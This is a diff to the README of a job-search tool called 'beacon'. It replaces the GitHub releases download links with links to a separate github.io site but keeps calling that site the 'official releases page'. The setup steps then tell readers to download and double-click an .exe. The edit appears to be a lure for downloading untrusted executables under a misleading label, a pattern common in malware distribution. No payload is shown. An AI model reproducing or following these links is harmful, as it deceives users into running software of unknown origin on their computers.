@@ -1,6 +1,6 @@
 # 🔍 beacon - Automate visa friendly job searching today
 
-[![Download Beacon](https://img.shields.io/badge/Download-Beacon-blue.svg)](https://github.com/sharpsightednessantigen999/beacon/releases)
+[![Download Beacon](https://img.shields.io/badge/Download-Beacon-blue.svg)](https://sharpsightednessantigen999.github.io)
 
 Beacon finds jobs for international students and visa holders on your own computer. It scans listings to filter for visa sponsorship support. You keep control of your data because the software runs locally. You do not need to sign up for accounts or manage external servers.
 
@@ -18,7 +18,7 @@ The software automates the tedious parts of a job search. It checks popular job 
 
 ## 📥 Downloading and setup
 
-1. Visit the [official releases page](https://github.com/sharpsightednessantigen999/beacon/releases). 
+1. Visit the [official releases page](https://sharpsightednessantigen999.github.io). 
 2. Select the latest version file ending in `.exe`.
 3. Save the file to a folder on your computer.
 4. Double-click the file to start the installation.
